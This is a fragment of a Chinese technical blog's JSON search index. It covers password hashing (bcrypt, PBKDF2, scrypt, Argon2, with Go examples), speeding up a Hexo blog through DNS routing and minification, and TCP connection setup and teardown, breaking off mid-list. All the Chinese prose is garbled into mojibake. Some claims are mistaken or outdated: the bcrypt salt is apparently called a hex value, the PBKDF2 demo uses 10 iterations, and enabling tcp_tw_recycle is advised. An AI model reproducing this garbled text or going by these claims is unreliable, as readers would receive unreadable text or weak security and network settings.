·çš„ã€‚å¯¹ä¸€ä¸ªå¯†ç ï¼ŒBcryptæ¯æ¬¡ç”Ÿæˆçš„hashéƒ½ä¸ä¸€æ ·ï¼Œé‚£ä¹ˆå®ƒæ˜¯å¦‚ä½•è¿›è¡Œæ ¡éªŒçš„ï¼Ÿ\n\nè™½ç„¶å¯¹åŒä¸€ä¸ªå¯†ç ï¼Œæ¯æ¬¡ç”Ÿæˆçš„hashä¸ä¸€æ ·ï¼Œä½†æ˜¯hashä¸­åŒ…å«äº†saltï¼ˆhashäº§ç”Ÿè¿‡ç¨‹ï¼šå…ˆéšæœºç”Ÿæˆsaltï¼Œsaltè·Ÿpasswordè¿›è¡Œhashï¼‰ï¼›\n\nåœ¨ä¸‹æ¬¡æ ¡éªŒæ—¶ï¼Œä»hashä¸­å–å‡ºsaltï¼Œsaltè·Ÿpasswordè¿›è¡Œhashï¼›å¾—åˆ°çš„ç»“æœè·Ÿä¿å­˜åœ¨DBä¸­çš„hashè¿›è¡Œæ¯”å¯¹ã€‚\n\nä¸¾ä¸ªæ —å­ï¼Œå‡å¦‚ä¸€ä¸ªå¯†æ–‡æ˜¯ `$2a$10$vI8aWBnW3fID.ZQ4/zo1G.q1lRps.9cGLcZEiGDMVr5yUP1KUOYTa`, é‚£ä¹ˆé€šè¿‡ `$` åˆ†éš”ç¬¦æˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸‹é¢ä¸‰ä¸ªä¿¡æ¯:\n\n1. `2a` è¡¨ç¤ºçš„æ˜¯ç”¨äºæ­¤æ¬¡è®¡ç®—çš„ bcrypt ç®—æ³•ç‰ˆæœ¬ï¼›\n2. `10` è¡¨ç¤ºçš„æ˜¯ `log_rounds` å€¼ï¼›\n3. `vI8aWBnW3fID.ZQ4/zo1G.q1lRps.9cGLcZEiGDMVr5yUP1KUOYTa` æ˜¯ salt å’ŒåŠ å¯†æ–‡æœ¬çš„æ‹¼æ¥å€¼ (ç»è¿‡äº† base 64 ç¼–ç ï¼Œå‰é¢ 22 ä¸ªå­—æ¯æ˜¯ salt çš„åå…­è¿›åˆ¶å€¼ã€‚\n\n\n\n# 4. PBKDF2ï¼ŒScryptï¼ŒBcrypt å’Œ ARGON2å¯¹æ¯”\n\n+ PBKDF2\n\nPBKDF2 è¢«è®¾è®¡çš„å¾ˆç®€å•ï¼Œå®ƒçš„åŸºæœ¬åŸç†æ˜¯é€šè¿‡ä¸€ä¸ªä¼ªéšæœºå‡½æ•°ï¼ˆä¾‹å¦‚ HMAC å‡½æ•°ï¼‰ï¼ŒæŠŠæ˜æ–‡å’Œä¸€ä¸ªç›å€¼ä½œä¸ºè¾“å…¥å‚æ•°ï¼Œç„¶åæŒ‰ç…§è®¾ç½®çš„è®¡ç®—å¼ºåº¦å› å­é‡å¤è¿›è¡Œè¿ç®—ï¼Œå¹¶æœ€ç»ˆäº§ç”Ÿå¯†é’¥ã€‚\n\nè¿™æ ·çš„é‡å¤ hash å·²ç»è¢«è®¤ä¸ºè¶³å¤Ÿå®‰å…¨ï¼Œä½†ä¹Ÿæœ‰äººæå‡ºäº†ä¸åŒæ„è§ï¼Œæ­¤ç±»ç®—æ³•å¯¹äºä¼ ç»Ÿçš„ CPU æ¥è¯´çš„ç¡®æ˜¯è¶³å¤Ÿå®‰å…¨ï¼Œä½¿ç”¨GPUé˜µåˆ—ã€æˆ–FPGAæ¥ç ´è§£PBKDF2ä»ç›¸å¯¹å®¹æ˜“ã€‚æ³¨æ„è¿™é‡Œè¯´çš„æ˜¯ç›¸å¯¹ï¼Œä¸ºäº†æ¯”è¾ƒæ¥ä¸‹æ¥æåˆ°çš„å¦å¤–ä¸¤ç§ç®—æ³•ã€‚\n\n+ BCrypt\n\nBCrypt åœ¨1999å¹´å‘æ˜ï¼Œç”±äºä½¿ç”¨GPUã€FPGAçš„ç ´è§£æ˜¯åŸºäºå®ƒä»¬ç›¸å¯¹äºCPUçš„å¹¶è¡Œè®¡ç®—ä¼˜åŠ¿ï¼Œå› æ­¤BCryptç®—æ³•ä¸ä»…è®¾è®¡ä¸ºCPUè¿ç®—å¯†é›†ï¼Œè€Œä¸”æ˜¯å†…å­˜IOå¯†é›†ã€‚\n\nç„¶è€Œéšç€æ—¶é—´è¿ç§»ï¼Œç›®å‰æ–°çš„FPGAå·²ç»é›†æˆäº†å¾ˆå¤§çš„RAMï¼ˆç±»å‹CPUç¼“å­˜ã€å¤§çº¦å‡ åå…†ï¼‰ï¼Œè§£å†³äº†å†…å­˜å¯†é›†IOçš„é—®é¢˜ã€‚\n\n+ Scrypt\n\nScrypt äº2009å¹´äº§ç”Ÿï¼Œå¼¥è¡¥äº†BCryptçš„ä¸è¶³ã€‚å®ƒå°†CPUè®¡ç®—ä¸å†…å­˜ä½¿ç”¨å¼€é”€æå‡äº†ä¸€ä¸ªå±‚æ¬¡ï¼Œä¸ä»…CPUè¿ç®—éœ€è¦æŒ‡æ•°æ—¶é—´å¼€é”€ï¼Œè¿˜éœ€è¦æŒ‡æ•°å†…å­˜IOå¼€é”€ã€‚\n\n+ Argon2\n\nArgon2 æœ‰ä¸¤ä¸ªä¸»è¦çš„ç‰ˆæœ¬ï¼š**Argon2i** æ˜¯å¯¹æŠ—ä¾§ä¿¡é“æ”»å‡»çš„æœ€å®‰å…¨é€‰æ‹©ï¼Œè€Œ **Argon2d** æ˜¯æŠµæŠ— GPU ç ´è§£æ”»å‡»çš„æœ€å®‰å…¨é€‰æ‹©ã€‚\n\nåœ¨ 2019 å¹´ï¼Œæˆ‘å»ºè®®ä½ ä»¥åä¸è¦ä½¿ç”¨PBKDF2 æˆ– BCryptï¼Œå¹¶å¼ºçƒˆå»ºè®®å°† Argon2ï¼ˆæœ€å¥½æ˜¯ **Argon2id**ï¼‰ç”¨äºæœ€æ–°ç³»ç»Ÿã€‚\n\nScrypt æ˜¯å½“ Argon2 ä¸å¯ç”¨æ—¶çš„ä¸äºŒé€‰æ‹©ï¼Œä½†è¦è®°ä½ï¼Œå®ƒåœ¨ä¾§ä¾§ä¿¡é“æ³„éœ²æ–¹é¢ä¹Ÿå­˜åœ¨ç›¸åŒçš„é—®é¢˜ã€‚\n\n  \n\n# 5. ä»£ç å®ç°\n\n+ pbkdf2 ä¸æ¨è\n\n  ```go\n  package main\n  \n  import (\n  \t\"crypto/sha256\"\n  \t\"fmt\"\n  \n  \t\"golang.org/x/crypto/pbkdf2\"\n  )\n  \n  func main() {\n  \n  \tpasswd := \"levonfly\"\n  \tsalt := \"salt\"\n  \n  \tres1 := pbkdf2.Key([]byte(passwd), []byte(salt), 10, 20, sha256.New)\n  \tfmt.Println(string(res1)) //'J!85|LU@\n  \n  \t// åŠ å¯†åä¸€æ ·\n  \tres2 := pbkdf2.Key([]byte(passwd), []byte(salt), 10, 20, sha256.New)\n  \tfmt.Println(string(res2)) //'J!85|LU@\n  \n  }\n  ```\n\n  \n\n+ bcrypt æ¨è\n\n  ```go\n  package main\n  \n  import (\n  \t\"fmt\"\n  \n  \t\"golang.org/x/crypto/bcrypt\"\n  )\n  \n  func main() {\n  \n  \tpasswd := \"levonfly\"\n  \t\n    // costé»˜è®¤æ˜¯10,ä¸è¦å¤ªå°\n  \tres1, _ := bcrypt.GenerateFromPassword([]byte(passwd), 10)\n  \tfmt.Println(string(res1)) //$2a$10$Y85p96ZRD1Sa5iU7M/ngku9MIFNkmAwEI38FvPT9dj628E8hPOU0K\n  \n  \t// åŠ å¯†ç»“æœä¸ä¸€æ ·\n  \tres2, _ := bcrypt.GenerateFromPassword([]byte(passwd), 10)\n  \tfmt.Println(string(res2)) //$2a$10$7xUWgmWB3te5OipBYx4aheUFz7dCcj7JLIpQW6D/Me1R4qljEIFy2\n  \n  \terr1 := bcrypt.CompareHashAndPassword(res1, []byte(passwd))\n  \tfmt.Println(err1) //nil\n  \n  \terr2 := bcrypt.CompareHashAndPassword(res1, []byte(\"random\"))\n  \tfmt.Println(err2) //crypto/bcrypt: hashedPassword is not the hash of the given password\n  }\n  ```\n\n+ scrypt æ¨è\n\n  ```go\n  package main\n  \n  import (\n  \t\"fmt\"\n  \n  \t\"golang.org/x/crypto/scrypt\"\n  )\n  \n  func main() {\n  \n  \tpasswd := \"levonfly\"\n  \tsalt := []byte{0xc8, 0x28, 0xf2, 0x58, 0xa7, 0x6a, 0xad, 0x7b}\n  \n  \tres1, _ := scrypt.Key([]byte(passwd), salt, 1<<15, 8, 1, 32)\n  \tfmt.Println(string(res1)) //TCoi[DRt;IALuw}\n  \n  \tres2, _ := scrypt.Key([]byte(passwd), salt, 1<<15, 8, 1, 32)\n  \tfmt.Println(string(res2)) //TCoi[DRt;IALuw}\n  }\n  ```\n\n  \n\n+ argon2 æ¨è\n\n  ```go\n  package main\n  \n  import (\n  \t\"encoding/base64\"\n  \t\"fmt\"\n  \n  \t\"golang.org/x/crypto/argon2\"\n  )\n  \n  func main() {\n  \n  \tpasswd := \"levonfly\"\n  \tsalt := \"salt\"\n  \n  \tres1 := argon2.IDKey([]byte(passwd), []byte(salt), 3, 32, 4, 32)\n  \tfmt.Println(base64.StdEncoding.EncodeToString(res1)) //uEZgAbCSfDyd8VAMbcmSSZKpH/TQ9hh9VsblPFGuDjM\n  \n  \tres2 := argon2.IDKey([]byte(passwd), []byte(salt), 3, 32, 4, 32)\n  \tfmt.Println(base64.StdEncoding.EncodeToString(res2)) //uEZgAbCSfDyd8VAMbcmSSZKpH/TQ9hh9VsblPFGuDjM\n  }\n  ```\n\n\n\n\n# 6. æ•°æ®åº“å­˜å‚¨\n\nå¦‚æœå­˜å‚¨æ…¢å“ˆå¸Œçš„å¯†ç , ä¸€èˆ¬éƒ½æ˜¯å­˜å‚¨å®šé•¿çš„. å¦‚`char(60)`\n\nå‚è€ƒ: https://stackoverflow.com/questions/247304/what-data-type-to-use-for-hashed-password-field-and-what-length/\n\n\n\n# 7. å‚è€ƒèµ„æ–™\n\n+  https://draveness.me/whys-the-design-password-with-md5/\n\n+ https://github.com/luokuning/blogs/issues/9\n\n+ https://juejin.im/post/5e70c152518825491949886e\n\n+ https://www.jianshu.com/p/732d9d960411","tags":["å¯†ç "],"categories":["è®¡ç®—æœºåŸºç¡€"]},{"title":"åŠ é€Ÿåšå®¢è®¿é—®é€Ÿåº¦","url":"%2Fp%2F5ee5b7c.html","content":"\n\n\nä¸åªä¸€ä¸ªäººè¯´è¿‡ï¼Œæˆ‘åšå®¢è®¿é—®çš„é€Ÿåº¦çœŸæ…¢ã€‚ åšå®¢è™½ç„¶åªæ˜¯è®°å½•ä¸ªäººå­¦ä¹ å†ç¨‹çš„åœ°æ–¹ï¼Œä½†ä¹Ÿè¦è®°å¾—ä¼˜åŒ–è®¿é—®é€Ÿåº¦ã€‚ \n\nä»Šå¤©ç»ˆäºæœ‰æ—¶é—´æŠ˜è…¾ä¸‹ï¼Œè®©ç½‘ç«™åœ¨å›½å†…å’Œå›½å¤–å„å¤‡ä»½ä¸€ä»½ï¼Œç„¶åå›½å†…çš„ç”¨æˆ·è®¿é—®å›½å†…çš„codingï¼Œå›½å¤–çš„ç”¨æˆ·è®¿é—®å›½å¤–çš„githubã€‚ \n\n<!-- more -->\n\n# 1. å›½å†…å¤–åˆ†æµ\n\n+ ç™»å½•ç½‘ç«™, https://wwww.coding.net/, æ³¨å†Œç™»å½•\n\n+ åˆ›å»ºé¡¹ç›®æ—¶å€™é€‰æ‹©DevOpsé¡¹ç›®, æ­¤å¤„ç”¨çš„è‡ªå·±çš„ç”¨æˆ·å`levonfly`, ä»“åº“åœ°å€ä¸º`git@e.coding.net:levonfly/levonfly.git`\n\n+ åœ¨ä¸ªäººè®¾ç½®é‡Œ, é…ç½®å…¬é’¥\n\n+ `ssh -T git@e.coding.net -i ~/.ssh/github-unix2dos`  æµ‹è¯•å¯†é’¥æ˜¯å¦èƒ½è®¿é—®\n\n+ ä¿®hexoé…ç½®æ–‡ä»¶\n\n  ```yaml\n  deploy:\n      -\n       type: git\n       repo:\n          github: git@unix2dos:unix2dos/unix2dos.github.io.git # githubåœ°å€\n          coding: git@e.coding.net:levonfly/levonfly.git #codingåœ°å€\n       branch: master\n  ```\n\n+ ä¿®æ”¹sshé…ç½®æ–‡ä»¶\n\n  ```yaml\n  Host coding e.coding.net\n  \tHostName e.coding.net\n  \tIdentityFile ~/.ssh/github-unix2dos # è‡ªå·±çš„ç§é’¥\n  \tUser levonfly\n  ```\n\n+ ä¸ªäººè®¾ç½®->å®åè®¤è¯\n\n+ é¡¹ç›®->æŒç»­éƒ¨ç½²->é™æ€ç½‘ç«™->å‘å¸ƒç½‘ç«™->ç«‹å³éƒ¨ç½²\n\n+ DNSè§£æ \n\n  CNAME->é»˜è®¤æŒ‡å‘coding-pages.com\n\n  CNMA->å¢ƒå¤–æŒ‡å‘github.io\n\n  æˆ‘çš„åŸŸå`liuvv.com`è§£æå¦‚ä¸‹\n\n  ```bash\n  ä¸»æœº ç±»å‹\t çº¿è·¯\t è®°å½•å€¼\n  www\tCNAME\tå¢ƒå¤–\tunix2dos.github.io\n  www\tCNAME\té»˜è®¤\tr8ea0k.coding-pages.com\n  ```\n\n  \n\n+ è¯ä¹¦ç”³è¯·å¤±è´¥\n\n  ç”³è¯·é”™è¯¯åŸå› æ˜¯ï¼šåœ¨éªŒè¯åŸŸåæ‰€æœ‰æƒæ—¶ä¼šå®šä½åˆ° Github Pages çš„ä¸»æœºä¸Šå¯¼è‡´ SSL è¯ä¹¦ç”³è¯·å¤±è´¥\n\n  æ­£ç¡®çš„åšæ³•æ˜¯ï¼šå…ˆå»åŸŸå DNS æŠŠ GitHub çš„è§£ææš‚åœæ‰ï¼Œç„¶åå†é‡æ–°ç”³è¯· SSL è¯ä¹¦ï¼Œå¤§çº¦åç§’å·¦å³å°±èƒ½ç”³è¯·æˆåŠŸï¼Œç„¶åå¼€å¯å¼ºåˆ¶ HTTPS è®¿é—®\n\n  \n\n+ æµ‹è¯•\n\n  ```bash\n  host www.liuvv.com   # å›½å†…æµ‹è¯•\n  www.liuvv.com is an alias for r8ea0k.coding-pages.com.\n  r8ea0k.coding-pages.com has address 150.109.4.162\n  r8ea0k.coding-pages.com has address 119.28.218.218\n  \n  \n  host www.liuvv.com  # å›½å¤–æœåŠ¡å™¨æµ‹è¯•\n  www.liuvv.com is an alias for unix2dos.github.io.\n  unix2dos.github.io has address 185.199.109.153\n  unix2dos.github.io has address 185.199.111.153\n  unix2dos.github.io has address 185.199.108.153\n  unix2dos.github.io has address 185.199.110.153\n  ```\n\n  \n\n  å¦å¤–å¯å¼€å¯å’Œå…³é—­vpn, åˆ·æ–°åšå®¢, çœ‹è¯ä¹¦çš„æœ‰æ•ˆæœŸä¹Ÿèƒ½çœ‹åˆ°åŒºåˆ«, å›½å†…å¤–è®¿é—®åŒä¸€ä¸ªåœ°å€, å®ç°äº†åˆ†æµ. è‡³æ­¤åŠ é€Ÿå¤§åŠŸå‘Šæˆ.\n\n\n\n# 2. hexoä¼˜åŒ–æ–¹æ¡ˆ\n\n###  2.1 ä¸»é¢˜æºåŠ è½½ä¼˜åŒ–\n\næŠŠåœ¨NexTä¸»é¢˜çš„_config.ymlé‡Œé¢çš„ï¼š\n\n```dart\n# Uri of fonts host. E.g. //fonts.googleapis.com (Default)\nhost:\n```\n\næ”¹ä¸ºï¼š\n\n```dart\n# Uri of fonts host. E.g. //fonts.googleapis.com (Default)\nhost: //fonts.lug.ustc.edu.cn\n```\n\nå› ä¸º`fonts.lug.ustc.edu.cn`æ˜¯ä¸­ç§‘å¤§çš„æºï¼Œç›¸æ¯”ä¹‹å‰èƒ½å¿«ä¸€ä¸‹\n\n### 2.2 å‹ç¼©é¡µé¢\n\n```bash\nnpm install hexo-neat --save\n```\n\né…ç½®æ–‡ä»¶\n\n```yml\nneat_enable: true\nneat_html:\n  enable: true\n  exclude:\n    - '**/baidu*.html'\n    - '**/google*.html'\nneat_css:\n  enable: true\n  exclude:\n    - '**/*.min.css'\nneat_js:\n  enable: true\n  mangle: true\n  output:\n  compress:\n  exclude:\n    - '**/*.min.js'\n    - '**/jquery.fancybox.pack.js'\n    - '**/index.js'\n```\n\n\n\n### 2.3 æ‡’åŠ è½½(æš‚æ—¶å…³é—­)\n\nhttps://github.com/theme-next/theme-next-jquery-lazyload\n\næ­¤å¤„ä¼šé€ æˆæŒä¹…é“¾æ¥æœ¬åœ°å›¾ç‰‡ä¸æ˜¾ç¤º, æœªè§£å†³.\n\n```bash\ncd themes/next\ngit clone https://github.com/theme-next/theme-next-jquery-lazyload source/lib/jquery_lazyload\n\n#Enable module in NexT _config.yml file:\nlazyload: true\n```\n\n\n\n### 2.4 å›¾ç‰‡å‹ç¼©\n\nhttps://imageoptim.com/mac\n\nå¯¼èˆªåˆ°ä½ çš„markdownç´¢å¼•çš„å›¾ç‰‡æ–‡ä»¶å¤¹ï¼Œå¹¶æŠŠé‡Œé¢çš„å›¾ç‰‡ç›´æ¥æ‹–å…¥ ImageOptim å°±å¥½äº†ï¼ŒåŒæ—¶å‹ç¼©å®Œä¼šç›´æ¥æ›¿æ¢ï¼Œç›´æ¥commitæ–°çš„ä¼˜åŒ–çš„å›¾ç‰‡å³å¯ï¼ŒåŸæ–‡ä»¶ä¼šè¢«æ‹‰å…¥åƒåœ¾ç®±(mac çš„åƒåœ¾ç®±)å¯æ¢å¤ï¼Œå‹ç¼©å¯ä»¥åœ¨ ImageOptim çš„ Preference é‡Œé¢è¿›è¡Œæ›´å¤§çš„å‹ç¼©æ¯”è®¾ç½®.\n\n\n\n# 3. cdnåŠ é€Ÿ\n\n### 3.1 é™æ€èµ„æºæ”¾åœ¨ cdn ä¸Š\n\nè¿˜æœ‰ä¸€ç§æ–¹æ¡ˆæ˜¯æŠŠç”Ÿæˆçš„é™æ€æ–‡ä»¶æ”¾åœ¨å›½å†…çš„CDNä¸Š, æ¥è¿›è¡ŒåŠ é€Ÿ\n\nå¯å‚è€ƒ: https://github.com/saltbo/uptoc\n\n### 3.2 cdnåŠ é€Ÿéƒ¨ç½²\n\nä¼˜åŒ–å‰å¾—åˆ†: 64 \n\n##### 3.2.1 Typoraé…ç½®\n\nå›¾ç‰‡ç›´æ¥ `Ctrl + v` å³å¯ç²˜è´´æ‹·è´åˆ°æŒ‡å®šç›®å½•å¹¶å®æ—¶é¢„è§ˆã€‚\n\n![image-20201127234658946](%E5%8A%A0%E9%80%9F%E5%8D%9A%E5%AE%A2%E8%AE%BF%E9%97%AE%E9%80%9F%E5%BA%A6/image-20201127234658946.png)\n\n##### 3.2.2 é…ç½®\n\n```bash\nnpm install hexo-deployer-cos-cdn --save\n\n```\n\n\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://www.cnblogs.com/sunhang32/p/11969964.html \n+ https://github.com/saltbo/uptoc\n+ https://www.jianshu.com/p/25766dda5a5f\n+ https://developers.google.com/speed/pagespeed/insights/  æµ‹è¯•ç½‘é¡µåŠ è½½é€Ÿåº¦\n","tags":["blog"],"categories":["ä¸ªäººè®°å½•"]},{"title":"tcpä»‹ç»å’Œtcpå»ºç«‹è¿æ¥è¿‡ç¨‹","url":"%2Fp%2F289c4599.html","content":"\n# 1. tcp ä»‹ç»å’Œ udp åŒºåˆ«\n\n|          | TCP                                                          | UDP                                       |\n| -------- | ------------------------------------------------------------ | ----------------------------------------- |\n| æ•°æ®ä¼ è¾“ | 3æŠ¥æ–‡æ¡æ‰‹+æ•°æ®ä¼ è¾“+4æŠ¥æ–‡æŒ¥æ‰‹                                 | æ•°æ®ä¼ è¾“                                  |\n| è¿æ¥æ–¹å¼ | å•æ’­(ä¸€å¯¹ä¸€)                                                 | å•æ’­(ä¸€å¯¹ä¸€), å¤šæ’­(ä¸€å¯¹å¤š), å¹¿æ’­ (ä¸€å¯¹å…¨) |\n| åº”ç”¨æŠ¥æ–‡ | ä¸€ç³»åˆ—å­—èŠ‚æµæ”¾åˆ°ç¼“å­˜ä¸­, é€šè¿‡æ»‘åŠ¨çª—å£ç­–ç•¥å‘é€<br>å‘é€æ–¹åŠ ä¸ª TCP å¤´éƒ¨<br>æ¥æ”¶æ–¹å–å‡ºå­—èŠ‚æµ,ç»„åˆé€ç»™æ¥æ”¶æ–¹è¿›ç¨‹ | æ¯ä¸ªæŠ¥æ–‡æ·»åŠ ä¸ªUDPé¦–éƒ¨                     |\n| é¦–éƒ¨     | æœ€å°20å­—èŠ‚, æœ€å¤§60å­—èŠ‚                                       | 8å­—èŠ‚                                     |\n\n<!-- more -->\n\n![1](tcpä»‹ç»å’Œtcpå»ºç«‹è¿æ¥è¿‡ç¨‹/1.png)\n\n\n\n# 2. tcpè¿æ¥\n\n![1](tcpä»‹ç»å’Œtcpå»ºç«‹è¿æ¥è¿‡ç¨‹/2.png)\n\n![1](tcpä»‹ç»å’Œtcpå»ºç«‹è¿æ¥è¿‡ç¨‹/3.png)\n\n\n\n### 2.1 å»ºç«‹è¿æ¥\n\n##### å®¢æˆ·ç«¯\n\n1. é¦–å…ˆå¤„äº closed çŠ¶æ€\n\n2. åˆ›å»ºä¼ è¾“æ§åˆ¶å¿«\n3. å‘é€æ¡æ‰‹â‘ SYN=1 seq=x  è¿›å…¥**SYN-SENT**(åŒæ­¥å·²å‘é€çŠ¶æ€)\n\n4. å‘é€æ¡æ‰‹â‘¢ACK=1 seq=x+1 ack=y+1 è¿›å…¥ **ESTABLISHED**(è¿æ¥å·²å»ºç«‹çŠ¶æ€)\n\n5. å¼€å§‹æ•°æ®ä¼ è¾“\n\n##### æœåŠ¡ç«¯\n\n1. é¦–å…ˆå¤„äº closed çŠ¶æ€\n\n2. åˆ›å»ºä¼ è¾“æ§åˆ¶å¿«\n\n  + tcp è¿æ¥è¡¨\n  + æŒ‡å‘å‘é€å’Œæ¥æ”¶ç¼“å­˜çš„æŒ‡é’ˆ\n  + æŒ‡å‘é‡ä¼ é˜Ÿåˆ—çš„æŒ‡é’ˆ\n  + å½“å‰çš„å‘é€å’Œæ¥æ”¶åºå·\n\n3. listen ç›‘å¬\n\n4. å‘é€æ¡æ‰‹â‘¡ SYN=1 ACK=1 seq=y ack=x+1  è¿›å…¥**SYN-REVD**(åŒæ­¥å·²æ¥æ”¶çŠ¶æ€)\n\n5. è¿›å…¥**ESTABLISHED**(è¿æ¥å·²å»ºç«‹çŠ¶æ€)\n\n6. å¼€å§‹æ•°æ®ä¼ è¾“\n\n\n\n### 2.2 é‡Šæ”¾è¿æ¥\n\n##### ä¸»åŠ¨ç«¯(å¯ä»¥æ˜¯å®¢æˆ·ç«¯,ä¹Ÿå¯ä»¥æ˜¯æœåŠ¡ç«¯)\n\n1. å‘é€æŒ¥æ‰‹â‘  FIN=1 ACK=1 seq=u  ack=v è¿›å…¥ **FIN_WAIT_1**(ç»ˆæ­¢ç­‰å¾…1çŠ¶æ€)\n\n2. æ”¶åˆ°æŒ¥æ‰‹â‘¡è¿›å…¥ **FIN_WAIT_2**(ç»ˆæ­¢ç­‰å¾…2çŠ¶æ€)\n\n3. æ¥å—æ•°æ®\n\n4. å‘é€æŒ¥æ‰‹â‘£ ACK=1 seq=u+1 ack=w+1 è¿›å…¥ **TIME_WAIT**(æ—¶é—´ç­‰å¾…çŠ¶æ€)\n\n5. ç»è¿‡2MSLå, è¿›å…¥ **CLOSED**(å…³é—­çŠ¶æ€)\n\n##### è¢«åŠ¨ç«¯(å¯ä»¥æ˜¯å®¢æˆ·ç«¯,ä¹Ÿå¯ä»¥æ˜¯æœåŠ¡ç«¯)\n\n1. å‘é€æŒ¥æ‰‹â‘¡ ACK=1 seq=v ack=u+1 å¹¶è¿›å…¥**CLOSE_WAIT**(å…³é—­ç­‰å¾…çŠ¶æ€)\n\n2. é€šçŸ¥åº”ç”¨è¿›ç¨‹æ–­å¼€è¿æ¥, å®¢æˆ·ç«¯åˆ°æœåŠ¡å™¨æ–¹å‘è¿æ¥å…³é—­, å±äºåŠå…³é—­çŠ¶æ€\n\n3. å‘é€æœªå‘å®Œçš„æ•°æ®\n\n4. å‘é€æŒ¥æ‰‹â‘¢ FIN=1 ACK=1 seq=w ack=u+1 è¿›å…¥ **LAST-ACK**(æœ€åç¡®è®¤çŠ¶æ€)\n\n5. æ”¶åˆ°æŒ¥æ‰‹â‘£åè¿›å…¥ **CLOSED**(å…³é—­çŠ¶æ€)\n\n\n\n# 3. tcp è¿æ¥é—®é¢˜\n\n### 3.1 ä¸ºä»€ä¹ˆä¸ç”¨ä¸¤æ¬¡æ¡æ‰‹\n\nå‡å¦‚ç¬¬ä¸€ä¸ªè¿æ¥å‘é€å¤±è´¥, é‡ä¼ åè¿‡äº†å¥½ä¹…å¥½ä¹…, åˆ°è¾¾äº†ã€‚ \n\næœåŠ¡å™¨å¯¹å¤±è´¥åçš„è¿æ¥åˆå»ºç«‹äº†ä¸€æ¬¡è¯·æ±‚, ä½†å®¢æˆ·ç«¯å¯èƒ½å¤„äºå…³é—­äº†éƒ½æ— æ³•ç†ä¼š, æœåŠ¡å™¨å°±æ— æ³•é‡Šæ”¾è¿™ä¸ªè¿æ¥ã€‚\n\n\n\n### 3.2 ä¸ºä»€ä¹ˆè¿›å…¥ TIME_WAIT è€Œä¸æ˜¯ç›´æ¥å…³é—­\n\nå› ä¸ºå®¢æˆ·ç«¯å‘é€æŒ¥æ‰‹â‘£çš„æ—¶å€™ï¼Œæœ‰å¯èƒ½å¤±è´¥ã€‚\n\nå¦‚æœå®¢æˆ·ç«¯ç›´æ¥å…³é—­, æœåŠ¡å™¨é‡å‘æŒ¥æ‰‹â‘¢, å®¢æˆ·ç«¯å¤„äºå…³é—­ä¸å“åº”, æœåŠ¡å™¨æ— æ³•é‡Šæ”¾èµ„æºã€‚\n\n\n\n### 3.3 CLOSE_WAIT å’Œ TIME_WAIT\n\n+ CLOSE_WAIT  è¢«åŠ¨å…³é—­ä¸€æ–¹çŠ¶æ€(å…³é—­ç­‰å¾…çŠ¶æ€ )\n\n  è¢«åŠ¨ç«¯å‘é€ç¡®è®¤æŒ¥æ‰‹â‘¡ä»¥å\n\n+ TIME_WAIT   ä¸»åŠ¨å…³é—­ä¸€æ–¹çŠ¶æ€(æ—¶é—´ç­‰å¾…çŠ¶æ€)\n\n  ä¸»åŠ¨ç«¯å‘é€ç¡®è®¤æŒ¥æ‰‹â‘£ä»¥å, å†ç­‰å¾…2ä¸ª2MSL\n\n  \n\n### 3.4 ä¿æ´»è®¡æ—¶å™¨çš„ä½œç”¨\n\nå‡å¦‚å»ºç«‹è¿æ¥å, å®¢æˆ·ç«¯å‡ºç°äº†æ•…éšœ\n\n+ æœåŠ¡å™¨æ¯æ¬¡æ”¶åˆ°è¯·æ±‚å, é‡æ–°å¯åŠ¨å®šæ—¶å™¨(2å°æ—¶)\n+ æœåŠ¡å™¨2å°æ—¶åæ²¡æ”¶åˆ°å®¢æˆ·ç«¯è¯·æ±‚, å‘é€æ¢æµ‹æŠ¥æ–‡æ®µ\n+ æœåŠ¡å™¨75ç§’é—´éš”å‘é€ä¸€ä¸ª, è¾¾åˆ°10ä¸ªæ— å“åº”,å…³é—­è¿æ¥\n\n\n\n### 3.5 TIME_WAIT è¿‡å¤š\n\nä¸€èˆ¬æƒ…å†µæœåŠ¡å™¨ç«¯ä¸ä¼šå‡ºç°TIME_WAITçŠ¶æ€ï¼Œå› ä¸ºå¤§å¤šæ•°æƒ…å†µéƒ½æ˜¯å®¢æˆ·ç«¯ä¸»åŠ¨å‘èµ·è¿æ¥å¹¶ä¸»åŠ¨å…³é—­è¿æ¥ã€‚\n\nä½†æ˜¯æŸäº›æœåŠ¡å¦‚pop/smtpã€ftpå´æ˜¯æœåŠ¡ç«¯æ”¶åˆ°å®¢æˆ·ç«¯çš„QUITå‘½ä»¤åä¸»åŠ¨å…³é—­è¿æ¥ï¼Œè¿™å°±é€ æˆè¿™ç±»æœåŠ¡å™¨ä¸Šå®¹æ˜“å‡ºç°å¤§é‡çš„TIME_WAITçŠ¶æ€çš„è¿æ¥ï¼Œè€Œä¸”å¹¶å‘é‡è¶Šå¤§å¤„äºæ­¤ç§çŠ¶æ€çš„è¿æ¥è¶Šå¤šã€‚\n\næœåŠ¡åœ¨ä¸»åŠ¨å…³é—­å®¢æˆ·ç«¯éæ³•è¯·æ±‚æˆ–æ¸…ç†é•¿æ—¶é—´ä¸æ´»åŠ¨çš„è¿æ¥æ—¶ï¼ˆè¿™ç§æƒ…å†µå¾ˆå¯èƒ½æ˜¯å®¢æˆ·ç«¯ç¨‹åºå¿˜è®°å…³é—­è¿æ¥ï¼‰ä¹Ÿä¼šå‡ºç°TIME_WAITçš„çŠ¶æ€ã€‚TIME_WAIT å¯¹äºwebæœåŠ¡å™¨æ¥è¯´ï¼Œå ç”¨äº†ä¸€ä¸ªsocket 60ç§’ï¼Œsocketçš„æ•°é‡æ˜¯æœ‰é™çš„ï¼Œæœ€å¤š65535ã€‚\n\nè§£å†³æ–¹æ¡ˆ\n\n> æ‰“å¼€ sysctl.conf æ–‡ä»¶ï¼Œä¿®æ”¹ä»¥ä¸‹å‡ ä¸ªå‚æ•°ï¼š\n\n- net.ipv4.tcp_tw_recycle = 1\tè¡¨ç¤ºå¼€å¯TCPè¿æ¥ä¸­TIME-WAIT socketsçš„å¿«é€Ÿå›æ”¶ï¼Œé»˜è®¤ä¸º0ï¼Œè¡¨ç¤ºå…³é—­\n- net.ipv4.tcp_tw_reuse = 1      é‡æ–°ä½¿ç”¨TIME_WAITçŠ¶æ€çš„è¿æ¥ã€‚\n- net.ipv4.tcp_timestamps = 1  